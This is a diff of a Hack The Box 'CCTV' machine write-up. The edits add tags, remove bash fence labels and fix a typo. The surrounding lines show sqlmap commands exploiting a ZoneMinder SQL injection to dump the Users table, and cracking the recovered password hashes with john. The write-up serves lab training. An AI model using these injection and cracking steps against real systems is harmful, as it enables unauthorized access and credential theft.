@@ -2,6 +2,7 @@ export const frontmatter = {
   title: "Hack The Box CCTV Machine Writeup",
   slug: "hack-the-box-cctv-machine-writeup",
   category: "HTB Machine",
+  tags: "zoneminder, motion eye",
   description:
     "Complete walkthrough of the Hack The Box CCTV machine, covering ZoneMinder SQL injection, credential extraction, SSH access, MotionEye authentication bypass, remote code execution, and privilege escalation to root.",
   date: "2026-07-12",
@@ -78,7 +79,7 @@ available databases [3]:
 intersting one being `zm`
 
 To list all tables in `zm` database use
-```bash
+```
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
 -p tid \
 --cookie="addMonitorsip=; ZMSESSID=2niijadnqk52i3aohbct4aj5u7; zmLogsTable.bs.table.sortName=Message; zmSkin=classic; AddMonitorsTable.bs.table.pageNumber=1; zmHeaderFlip=up; zmCSS=base; zmLogsTable.bs.table.sortOrder=desc" \
@@ -103,8 +104,8 @@ Database: zm
 
 The interesting table being the `Users`, check out [this](https://forums.zoneminder.com/viewtopic.php?p=1038#p1038) to know why
 
-Tump `Users` table from `zm` database use:
-```bash
+Dump `Users` table from `zm` database use:
+```
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
 -p tid \
 --cookie="addMonitorsip=; ZMSESSID=2niijadnqk52i3aohbct4aj5u7; zmLogsTable.bs.table.sortName=Message; zmSkin=classic; AddMonitorsTable.bs.table.pageNumber=1; zmHeaderFlip=up; zmCSS=base; zmLogsTable.bs.table.sortOrder=desc" \
@@ -127,7 +128,7 @@ Table: Users
 We find 3 interesting password hash which we can try to crack with `john`
 
 Save hashes with:
-```bash
+```
 echo "$2y...<SINP>...tbm" > hashes.txt
 echo "$2y...<SINP>...FG." >> hashes.txt
 echo "$2y...<SINP>...M6m" >> hashes.txt
@@ -136,7 +137,7 @@ echo "$2y...<SINP>...M6m" >> hashes.txt
 > **NOTE:** While adding hashes to `hashes.txt` do not forget to replace with your original hash value
 
 To crack the hash with john use:
-```bash
+```
 john hashes.txt --wordlist=wordlist.txt
 ```
 Here:
